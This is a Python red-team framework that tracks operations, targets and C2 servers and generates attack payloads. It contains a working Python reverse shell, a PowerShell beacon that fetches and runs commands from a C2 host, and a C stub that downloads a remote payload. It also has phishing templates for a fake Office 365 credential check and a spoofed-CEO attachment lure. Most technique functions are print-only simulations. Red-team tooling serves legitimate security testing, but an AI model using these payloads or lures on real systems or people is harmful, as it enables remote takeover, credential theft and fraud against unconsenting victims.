#!/usr/bin/env python3
"""
Red Team Operations Framework
Author: ibrahimsql
Description: Comprehensive red team operations management system
"""

import json
import time
import base64
import hashlib
import requests
from datetime import datetime, timedelta
from typing import Dict, List, Optional
import subprocess
import threading
import sqlite3
from cryptography.fernet import Fernet
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import random
import string
import os
import socket
import ssl

class RedTeamOperationsFramework:
    def __init__(self, operation_name: str, db_path: str = "redteam_ops.db"):
        self.operation_name = operation_name
        self.db_path = db_path
        self.encryption_key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.encryption_key)
        self.active_sessions = {}
        self.c2_servers = []
        self._init_database()
        
    def _init_database(self):
        """Initialize operations database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Operations table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS operations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                operation_name TEXT,
                start_date DATE,
                end_date DATE,
                status TEXT,
                objectives TEXT,
                scope TEXT,
                rules_of_engagement TEXT,
                team_members TEXT
            )
        ''')
        
        # Targets table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                operation_id INTEGER,
                target_name TEXT,
                target_type TEXT,
                ip_address TEXT,
                domain TEXT,
                os_type TEXT,
                services TEXT,
                vulnerabilities TEXT,
                compromise_status TEXT,
                FOREIGN KEY (operation_id) REFERENCES operations (id)
            )
        ''')
        
        # Activities table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS activities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                operation_id INTEGER,
                target_id INTEGER,
                activity_type TEXT,
                technique_id TEXT,
                timestamp DATETIME,
                description TEXT,
                success BOOLEAN,
                evidence TEXT,
                operator TEXT,
                FOREIGN KEY (operation_id) REFERENCES operations (id),
                FOREIGN KEY (target_id) REFERENCES targets (id)
            )
        ''')
        
        # C2 Infrastructure table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS c2_infrastructure (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                operation_id INTEGER,
                server_type TEXT,
                domain TEXT,
                ip_address TEXT,
                port INTEGER,
                protocol TEXT,
                status TEXT,
                deployment_date DATE,
                FOREIGN KEY (operation_id) REFERENCES operations (id)
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def create_operation(self, objectives: List[str], scope: List[str], 
                        roe: Dict, team_members: List[str]) -> int:
        """Yeni red team operasyonu oluştur"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO operations 
            (operation_name, start_date, status, objectives, scope, 
             rules_of_engagement, team_members)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            self.operation_name,
            datetime.now().date(),
            'planning',
            json.dumps(objectives),
            json.dumps(scope),
            json.dumps(roe),
            json.dumps(team_members)
        ))
        
        operation_id = cursor.lastrowid
        conn.commit()
        conn.close()
        
        print(f"[+] Operation '{self.operation_name}' created with ID: {operation_id}")
        return operation_id
    
    def add_target(self, operation_id: int, target_info: Dict) -> int:
        """Hedef sistemi ekle"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO targets 
            (operation_id, target_name, target_type, ip_address, domain, 
             os_type, services, vulnerabilities, compromise_status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            operation_id,
            target_info.get('name', ''),
            target_info.get('type', ''),
            target_info.get('ip_address', ''),
            target_info.get('domain', ''),
            target_info.get('os_type', ''),
            json.dumps(target_info.get('services', [])),
            json.dumps(target_info.get('vulnerabilities', [])),
            'not_compromised'
        ))
        
        target_id = cursor.lastrowid
        conn.commit()
        conn.close()
        
        print(f"[+] Target '{target_info.get('name')}' added with ID: {target_id}")
        return target_id
    
    def log_activity(self, operation_id: int, target_id: int, activity_type: str,
                    technique_id: str, description: str, success: bool, 
                    evidence: str = "", operator: str = "unknown"):
        """Aktivite kaydet"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO activities 
            (operation_id, target_id, activity_type, technique_id, 
             timestamp, description, success, evidence, operator)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            operation_id, target_id, activity_type, technique_id,
            datetime.now(), description, success, evidence, operator
        ))
        
        conn.commit()
        conn.close()
        
        status = "SUCCESS" if success else "FAILED"
        print(f"[{status}] {technique_id}: {description}")
    
    def setup_c2_infrastructure(self, operation_id: int, config: Dict) -> Dict:
        """C2 altyapısını kur"""
        c2_info = {
            'domain': config.get('domain', f"c2-{random.randint(1000, 9999)}.com"),
            'ip_address': config.get('ip_address', '127.0.0.1'),
            'port': config.get('port', 443),
            'protocol': config.get('protocol', 'HTTPS'),
            'server_type': config.get('server_type', 'team_server')
        }
        
        # Veritabanına kaydet
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO c2_infrastructure 
            (operation_id, server_type, domain, ip_address, port, protocol, 
             status, deployment_date)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            operation_id, c2_info['server_type'], c2_info['domain'],
            c2_info['ip_address'], c2_info['port'], c2_info['protocol'],
            'active', datetime.now().date()
        ))
        
        conn.commit()
        conn.close()
        
        self.c2_servers.append(c2_info)
        print(f"[+] C2 Infrastructure deployed: {c2_info['domain']}:{c2_info['port']}")
        
        return c2_info
    
    def generate_payload(self, payload_type: str, target_os: str, 
                        c2_config: Dict) -> str:
        """Özel payload oluştur"""
        payload_templates = {
            'powershell_beacon': {
                'windows': '''
$c2_server = "{domain}"
$c2_port = {port}
$beacon_interval = 60

while($true) {{
    try {{
        $request = [System.Net.WebRequest]::Create("https://$c2_server:$c2_port/beacon")
        $request.Method = "POST"
        $request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        
        $response = $request.GetResponse()
        $stream = $response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $command = $reader.ReadToEnd()
        
        if($command -ne "") {{
            $output = Invoke-Expression $command 2>&1 | Out-String
            # Send output back to C2
        }}
    }} catch {{
        # Error handling
    }}
    
    Start-Sleep $beacon_interval
}}
'''
            },
            'python_reverse_shell': {
                'linux': '''
import socket
import subprocess
import os
import time

def connect_back():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("{ip_address}", {port}))
            
            while True:
                command = s.recv(1024).decode('utf-8')
                if command.lower() == 'exit':
                    break
                    
                if command:
                    output = subprocess.run(command, shell=True, 
                                          capture_output=True, text=True)
                    result = output.stdout + output.stderr
                    s.send(result.encode('utf-8'))
            
            s.close()
        except:
            time.sleep(30)
            continue

connect_back()
'''
            },
            'c_shellcode': {
                'windows': '''
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

int main() {{
    HINTERNET hInternet, hConnect;
    char buffer[1024];
    DWORD bytesRead;
    
    hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {{
        hConnect = InternetOpenUrl(hInternet, "https://{domain}:{port}/payload", 
                                  NULL, 0, INTERNET_FLAG_SECURE, 0);
        if (hConnect) {{
            InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead);
            // Execute shellcode
            InternetCloseHandle(hConnect);
        }}
        InternetCloseHandle(hInternet);
    }}
    return 0;
}}
'''
            }
        }
        
        if payload_type in payload_templates and target_os in payload_templates[payload_type]:
            template = payload_templates[payload_type][target_os]
            payload = template.format(**c2_config)
            
            # Payload'ı encode et
            encoded_payload = base64.b64encode(payload.encode()).decode()
            
            print(f"[+] Generated {payload_type} payload for {target_os}")
            return encoded_payload
        else:
            print(f"[-] Unsupported payload type: {payload_type} for {target_os}")
            return ""
    
    def execute_mitre_technique(self, operation_id: int, target_id: int, 
                               technique_id: str, parameters: Dict) -> bool:
        """MITRE ATT&CK tekniğini uygula"""
        techniques = {
            'T1566.001': self._spearphishing_attachment,
            'T1078': self._valid_accounts,
            'T1055': self._process_injection,
            'T1547.001': self._registry_run_keys,
            'T1021.001': self._remote_desktop_protocol,
            'T1083': self._file_and_directory_discovery,
            'T1057': self._process_discovery,
            'T1082': self._system_information_discovery,
            'T1041': self._exfiltration_over_c2_channel
        }
        
        if technique_id in techniques:
            try:
                success = techniques[technique_id](parameters)
                self.log_activity(operation_id, target_id, "mitre_technique", 
                                technique_id, f"Executed {technique_id}", 
                                success, json.dumps(parameters))
                return success
            except Exception as e:
                self.log_activity(operation_id, target_id, "mitre_technique", 
                                technique_id, f"Failed to execute {technique_id}: {str(e)}", 
                                False, json.dumps(parameters))
                return False
        else:
            print(f"[-] Technique {technique_id} not implemented")
            return False
    
    def _spearphishing_attachment(self, params: Dict) -> bool:
        """T1566.001: Spearphishing Attachment"""
        target_email = params.get('target_email')
        attachment_path = params.get('attachment_path')
        subject = params.get('subject', 'Important Document')
        
        if not target_email or not attachment_path:
            return False
        
        # Email gönderme simülasyonu
        print(f"[+] Sending spearphishing email to {target_email}")
        print(f"    Subject: {subject}")
        print(f"    Attachment: {attachment_path}")
        
        # Gerçek implementasyonda SMTP kullanılır
        return True
    
    def _valid_accounts(self, params: Dict) -> bool:
        """T1078: Valid Accounts"""
        username = params.get('username')
        password = params.get('password')
        target_system = params.get('target_system')
        
        print(f"[+] Attempting authentication with {username}@{target_system}")
        
        # Credential validation simülasyonu
        # Gerçek implementasyonda authentication attempt yapılır
        return True
    
    def _process_injection(self, params: Dict) -> bool:
        """T1055: Process Injection"""
        target_process = params.get('target_process', 'explorer.exe')
        payload = params.get('payload')
        
        print(f"[+] Injecting payload into {target_process}")
        
        # Process injection simülasyonu
        return True
    
    def _registry_run_keys(self, params: Dict) -> bool:
        """T1547.001: Registry Run Keys / Startup Folder"""
        key_name = params.get('key_name', 'WindowsUpdate')
        executable_path = params.get('executable_path')
        
        print(f"[+] Creating registry run key: {key_name}")
        print(f"    Path: {executable_path}")
        
        # Registry modification simülasyonu
        return True
    
    def _remote_desktop_protocol(self, params: Dict) -> bool:
        """T1021.001: Remote Desktop Protocol"""
        target_ip = params.get('target_ip')
        username = params.get('username')
        password = params.get('password')
        
        print(f"[+] Attempting RDP connection to {target_ip}")
        print(f"    Credentials: {username}:{password}")
        
        # RDP connection simülasyonu
        return True
    
    def _file_and_directory_discovery(self, params: Dict) -> bool:
        """T1083: File and Directory Discovery"""
        search_path = params.get('search_path', 'C:\\')
        file_patterns = params.get('file_patterns', ['*.doc', '*.pdf', '*.xls'])
        
        print(f"[+] Searching for files in {search_path}")
        print(f"    Patterns: {file_patterns}")
        
        # File discovery simülasyonu
        discovered_files = [
            'C:\\Users\\victim\\Documents\\passwords.txt',
            'C:\\Users\\victim\\Desktop\\financial_data.xlsx',
            'C:\\temp\\backup.zip'
        ]
        
        print(f"[+] Discovered {len(discovered_files)} files")
        return True
    
    def _process_discovery(self, params: Dict) -> bool:
        """T1057: Process Discovery"""
        print("[+] Enumerating running processes")
        
        # Process enumeration simülasyonu
        processes = [
            {'name': 'explorer.exe', 'pid': 1234, 'user': 'DOMAIN\\user'},
            {'name': 'chrome.exe', 'pid': 5678, 'user': 'DOMAIN\\user'},
            {'name': 'outlook.exe', 'pid': 9012, 'user': 'DOMAIN\\user'}
        ]
        
        print(f"[+] Found {len(processes)} running processes")
        return True
    
    def _system_information_discovery(self, params: Dict) -> bool:
        """T1082: System Information Discovery"""
        print("[+] Gathering system information")
        
        # System info gathering simülasyonu
        system_info = {
            'hostname': 'VICTIM-PC',
            'os': 'Windows 10 Enterprise',
            'domain': 'CORPORATE.LOCAL',
            'ip_address': '192.168.1.100',
            'installed_software': ['Office 365', 'Chrome', 'Antivirus']
        }
        
        print(f"[+] System: {system_info['hostname']} ({system_info['os']})")
        return True
    
    def _exfiltration_over_c2_channel(self, params: Dict) -> bool:
        """T1041: Exfiltration Over C2 Channel"""
        file_path = params.get('file_path')
        c2_server = params.get('c2_server')
        
        print(f"[+] Exfiltrating {file_path} to {c2_server}")
        
        # Data exfiltration simülasyonu
        return True
    
    def generate_operation_report(self, operation_id: int) -> str:
        """Operasyon raporu oluştur"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Operasyon bilgileri
        cursor.execute('SELECT * FROM operations WHERE id = ?', (operation_id,))
        operation = cursor.fetchone()
        
        # Hedefler
        cursor.execute('SELECT * FROM targets WHERE operation_id = ?', (operation_id,))
        targets = cursor.fetchall()
        
        # Aktiviteler
        cursor.execute('''
            SELECT a.*, t.target_name FROM activities a 
            JOIN targets t ON a.target_id = t.id 
            WHERE a.operation_id = ? 
            ORDER BY a.timestamp
        ''', (operation_id,))
        activities = cursor.fetchall()
        
        # C2 Infrastructure
        cursor.execute('SELECT * FROM c2_infrastructure WHERE operation_id = ?', (operation_id,))
        c2_infra = cursor.fetchall()
        
        conn.close()
        
        # Rapor oluştur
        report = f"""
# Red Team Operation Report

## Operation Overview
- **Operation Name**: {operation[1]}
- **Start Date**: {operation[2]}
- **Status**: {operation[4]}
- **Objectives**: {json.loads(operation[5])}
- **Scope**: {json.loads(operation[6])}
- **Team Members**: {json.loads(operation[8])}

## Targets ({len(targets)})
"""
        
        for target in targets:
            report += f"""
### {target[2]} ({target[3]})
- **Type**: {target[3]}
- **IP Address**: {target[4]}
- **Domain**: {target[5]}
- **OS**: {target[6]}
- **Status**: {target[9]}
"""
        
        report += f"\n## Activities ({len(activities)})\n"
        
        success_count = 0
        for activity in activities:
            status = "✅" if activity[7] else "❌"
            if activity[7]:
                success_count += 1
            
            report += f"""
### {activity[4]} - {activity[10]}
- **Status**: {status}
- **Timestamp**: {activity[5]}
- **Description**: {activity[6]}
- **Operator**: {activity[9]}
"""
        
        report += f"\n## C2 Infrastructure ({len(c2_infra)})\n"
        
        for c2 in c2_infra:
            report += f"""
### {c2[2]} ({c2[3]})
- **Type**: {c2[2]}
- **Domain**: {c2[3]}
- **IP**: {c2[4]}:{c2[5]}
- **Protocol**: {c2[6]}
- **Status**: {c2[7]}
"""
        
        # İstatistikler
        success_rate = (success_count / len(activities) * 100) if activities else 0
        
        report += f"""
## Operation Statistics
- **Total Activities**: {len(activities)}
- **Successful Activities**: {success_count}
- **Success Rate**: {success_rate:.1f}%
- **Targets Compromised**: {len([t for t in targets if t[9] == 'compromised'])}
- **C2 Servers Deployed**: {len(c2_infra)}

## Recommendations
1. Implement additional monitoring for techniques that succeeded
2. Review and update security controls based on identified weaknesses
3. Conduct security awareness training for social engineering vulnerabilities
4. Enhance endpoint detection and response capabilities
"""
        
        return report
    
    def cleanup_operation(self, operation_id: int):
        """Operasyon temizliği"""
        print(f"[+] Cleaning up operation {operation_id}")
        
        # C2 sunucularını kapat
        for c2 in self.c2_servers:
            print(f"[+] Shutting down C2 server: {c2['domain']}")
        
        # Operasyon durumunu güncelle
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute(
            'UPDATE operations SET status = ?, end_date = ? WHERE id = ?',
            ('completed', datetime.now().date(), operation_id)
        )
        
        conn.commit()
        conn.close()
        
        print(f"[+] Operation {operation_id} cleanup completed")

class SocialEngineeringFramework:
    def __init__(self):
        self.campaigns = {}
        self.templates = self._load_email_templates()
        
    def _load_email_templates(self) -> Dict:
        """Email şablonlarını yükle"""
        return {
            'phishing_office365': {
                'subject': 'Action Required: Verify Your Office 365 Account',
                'body': '''
Dear Employee,

We have detected unusual activity on your Office 365 account. 
To secure your account, please verify your credentials by clicking the link below:

{phishing_link}

This verification must be completed within 24 hours to avoid account suspension.

Best regards,
IT Security Team
'''
            },
            'spear_phishing_ceo': {
                'subject': 'Urgent: Confidential Financial Information Required',
                'body': '''
Hello {target_name},

I need you to review the attached financial documents urgently. 
Please download and review the files, then provide your feedback.

{malicious_attachment}

This is time-sensitive, please handle immediately.

Regards,
{spoofed_ceo_name}
CEO
'''
            }
        }
    
    def create_phishing_campaign(self, campaign_name: str, target_list: List[str], 
                               template_name: str, payload_url: str) -> str:
        """Phishing kampanyası oluştur"""
        campaign_id = f"campaign_{random.randint(1000, 9999)}"
        
        self.campaigns[campaign_id] = {
            'name': campaign_name,
            'targets': target_list,
            'template': template_name,
            'payload_url': payload_url,
            'created_date': datetime.now(),
            'status': 'created',
            'results': []
        }
        
        print(f"[+] Phishing campaign '{campaign_name}' created with ID: {campaign_id}")
        return campaign_id
    
    def send_phishing_emails(self, campaign_id: str) -> Dict:
        """Phishing emaillerini gönder"""
        if campaign_id not in self.campaigns:
            return {'error': 'Campaign not found'}
        
        campaign = self.campaigns[campaign_id]
        template = self.templates.get(campaign['template'])
        
        if not template:
            return {'error': 'Template not found'}
        
        results = {
            'sent': 0,
            'failed': 0,
            'targets': []
        }
        
        for target_email in campaign['targets']:
            try:
                # Email içeriğini hazırla
                email_body = template['body'].format(
                    phishing_link=campaign['payload_url'],
                    target_name=target_email.split('@')[0],
                    malicious_attachment=campaign['payload_url']
                )
                
                # Email gönderme simülasyonu
                print(f"[+] Sending phishing email to {target_email}")
                print(f"    Subject: {template['subject']}")
                
                results['sent'] += 1
                results['targets'].append({
                    'email': target_email,
                    'status': 'sent',
                    'timestamp': datetime.now().isoformat()
                })
                
            except Exception as e:
                print(f"[-] Failed to send email to {target_email}: {str(e)}")
                results['failed'] += 1
                results['targets'].append({
                    'email': target_email,
                    'status': 'failed',
                    'error': str(e),
                    'timestamp': datetime.now().isoformat()
                })
        
        campaign['status'] = 'sent'
        campaign['results'] = results
        
        return results

# Kullanım örneği
if __name__ == "__main__":
    # Red Team operasyonu başlat
    rt_framework = RedTeamOperationsFramework("Operation_RedStorm")
    
    # Operasyon oluştur
    operation_id = rt_framework.create_operation(
        objectives=["Test network security", "Evaluate incident response"],
        scope=["192.168.1.0/24", "corporate.local"],
        roe={"no_data_destruction": True, "business_hours_only": False},
        team_members=["red_team_lead", "penetration_tester", "social_engineer"]
    )
    
    # Hedef ekle
    target_id = rt_framework.add_target(operation_id, {
        'name': 'Domain Controller',
        'type': 'server',
        'ip_address': '192.168.1.10',
        'domain': 'corporate.local',
        'os_type': 'Windows Server 2019',
        'services': ['AD', 'DNS', 'LDAP'],
        'vulnerabilities': ['CVE-2021-34527']
    })
    
    # C2 altyapısını kur
    c2_config = rt_framework.setup_c2_infrastructure(operation_id, {
        'domain': 'legitimate-update.com',
        'ip_address': '203.0.113.10',
        'port': 443,
        'protocol': 'HTTPS'
    })
    
    # Payload oluştur
    payload = rt_framework.generate_payload('powershell_beacon', 'windows', c2_config)
    
    # MITRE ATT&CK tekniklerini uygula
    rt_framework.execute_mitre_technique(operation_id, target_id, 'T1566.001', {
        'target_email': 'victim@corporate.local',
        'attachment_path': '/tmp/malicious.docx',
        'subject': 'Quarterly Report - Action Required'
    })
    
    rt_framework.execute_mitre_technique(operation_id, target_id, 'T1078', {
        'username': 'admin',
        'password': 'Password123!',
        'target_system': '192.168.1.10'
    })
    
    # Sosyal mühendislik kampanyası
    se_framework = SocialEngineeringFramework()
    
    campaign_id = se_framework.create_phishing_campaign(
        "Office365_Credential_Harvest",
        ["user1@corporate.local", "user2@corporate.local"],
        "phishing_office365",
        "https://legitimate-update.com/office365-login"
    )
    
    se_results = se_framework.send_phishing_emails(campaign_id)
    print(f"Phishing campaign results: {se_results}")
    
    # Operasyon raporu oluştur
    report = rt_framework.generate_operation_report(operation_id)
    print("\n" + "="*50)
    print("OPERATION REPORT")
    print("="*50)
    print(report)
    
    # Temizlik
    rt_framework.cleanup_operation(operation_id)
    
    print("\n[+] Red Team Operations Framework demonstration completed!")